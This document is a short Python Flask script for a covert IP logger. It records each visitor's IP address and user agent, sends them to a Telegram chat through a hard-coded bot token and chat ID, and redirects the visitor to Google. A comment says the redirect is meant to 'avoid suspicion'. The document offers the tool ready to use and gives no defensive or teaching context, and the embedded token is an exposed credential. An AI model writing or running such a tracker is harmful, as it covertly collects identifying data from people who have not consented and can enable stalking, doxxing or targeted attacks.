from flask import Flask, request
import requests

app = Flask(__name__)

# Replace these with your bot's details
BOT_TOKEN = "8437759141:AAGslxFVueU10COTQIbILstpJJJ0Aw6kQtY"  # From @BotFather
CHAT_ID = "6925279684"      # From @userinfobot

@app.route('/')
def log_ip():
    # Get visitor's IP and user agent
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Send to Telegram
    message = f"🚨 New IP Captured:\nIP: `{ip}`\nUser Agent: `{user_agent}`"
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    )

    # Redirect to avoid suspicion (e.g., Google)
    return "Page moved permanently.", 301, {"Location": "https://google.com"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
